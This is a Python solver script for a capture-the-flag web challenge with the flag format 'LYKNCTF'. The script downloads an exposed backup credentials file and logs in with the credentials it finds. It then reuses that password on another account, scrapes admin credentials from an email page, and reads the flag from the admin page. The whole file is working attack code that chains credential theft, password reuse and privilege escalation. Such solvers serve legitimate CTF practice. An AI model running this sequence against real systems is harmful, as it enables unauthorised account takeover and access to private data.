#!/usr/bin/env python3
import re

import requests
from bs4 import BeautifulSoup


BASE = "http://65352921-0b1b-42e3-8a49-6f7a1362b06a.51.79.140.18.nip.io:8080"


def login(session: requests.Session, username: str, password: str) -> None:
    response = session.post(
        f"{BASE}/login",
        data={"username": username, "password": password},
        allow_redirects=False,
        timeout=10,
    )
    if response.status_code != 302:
        raise RuntimeError(f"login failed for {username}: {response.status_code}")


def main() -> None:
    backup = requests.get(f"{BASE}/Backup/credentials.txt", timeout=10).text
    employee_user = re.search(r"Username: (.+)", backup).group(1)
    employee_pass = re.search(r"Password: (.+)", backup).group(1)

    session = requests.Session()
    login(session, employee_user, employee_pass)

    senior = requests.Session()
    login(senior, "minh.le", employee_pass)
    mail = BeautifulSoup(senior.get(f"{BASE}/email/2", timeout=10).text, "html.parser").get_text("\n")
    admin_user = re.search(r"Username:\s*(\S+)", mail).group(1)
    admin_pass = re.search(r"Password:\s*(\S+)", mail).group(1)

    admin = requests.Session()
    login(admin, admin_user, admin_pass)
    admin_page = admin.get(f"{BASE}/admin", timeout=10).text
    flag = re.search(r"LYKNCTF\{[^}]+\}", admin_page).group(0)
    print(f"Admin page returned: Flag: {flag}")


if __name__ == "__main__":
    main()
